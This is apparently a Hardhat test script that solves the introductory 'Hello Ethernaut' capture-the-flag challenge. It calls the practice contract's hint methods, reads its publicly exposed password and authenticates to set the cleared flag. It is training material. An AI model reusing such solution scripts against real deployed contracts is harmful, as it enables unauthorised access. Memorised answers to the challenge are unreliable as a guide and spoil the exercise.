const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Hello Ethernaut', () => {

    let deployer, attacker;
 
    before(async () => {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const InstanceFactory = await ethers.getContractFactory('Instance');
            this.target = InstanceFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const InstanceFactory = await ethers.getContractFactory('Instance', deployer);
            this.target = await InstanceFactory.deploy("s3cur3P@ssw0rd!!");
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        let info = await this.target.info();
        console.log(`\t info : ${info}`);

        let info1 = await this.target.info1();
        console.log(`\t info1: ${info1}`);

        let info2 = await this.target.info2("hello");
        console.log(`\t info2: ${info2}`);

        let infoNum = await this.target.infoNum();
        console.log(`\t infoNum: ${infoNum}`);

        let info42 = await this.target.info42();
        console.log(`\t info42: ${info42}`);

        let theMethodName = await this.target.theMethodName();
        console.log(`\t theMethodName: ${theMethodName}`);

        let method7123949 = await this.target.method7123949();
        console.log(`\t method7123949: ${method7123949}`);

        let password = await this.target.password();
        console.log(`\t password: ${password}`);

        let authenticate = await this.target.connect(attacker).authenticate(password);
        await authenticate.wait();

        let cleared = await this.target.getCleared();
        console.log(`\t cleared: ${cleared}`);
    }).timeout(0);

    after(async () => {
         /** SUCCESS CONDITIONS */
        let cleared = await this.target.getCleared();
        expect(cleared).to.be.eq(true);
    });
    
});